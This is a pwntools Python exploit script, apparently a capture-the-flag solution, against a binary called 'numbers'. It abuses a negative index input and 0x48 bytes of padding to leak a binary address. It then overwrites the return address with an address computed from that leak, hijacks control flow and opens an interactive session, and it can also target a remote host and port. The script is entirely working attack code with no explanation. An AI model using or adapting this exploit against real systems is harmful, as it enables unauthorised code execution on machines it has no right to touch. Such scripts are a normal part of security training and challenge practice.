#!/usr/bin/env python3

import sys
from pwn import *

context.arch = "x86_64"

DEBUG = False
if len(sys.argv) > 1 and sys.argv[1] == "debug":
    DEBUG = True

LOCAL = True
if len(sys.argv) > 2:
    LOCAL = False

binary = ELF("./numbers")

if LOCAL:
    target = binary.process()
    if DEBUG:
        pause()
else:
    target = remote(sys.argv[1], sys.argv[2])

PADDING = b"A" * 0x48

target.recvuntil("??\n")
target.sendline("-2")

target.recvuntil("??\n")
target.send(PADDING)

target.recvn(0x48)
bin_leak_raw = target.recvuntil("\n", drop=True)
bin_leak = u64(bin_leak_raw + b"\x00" * (8 - len(bin_leak_raw)))

target.sendline("y")
target.sendline("-2")
target.send(PADDING + p64(bin_leak - 0x82))
target.recvline()

print(f"Binary leak: {hex(bin_leak)}")

target.interactive()
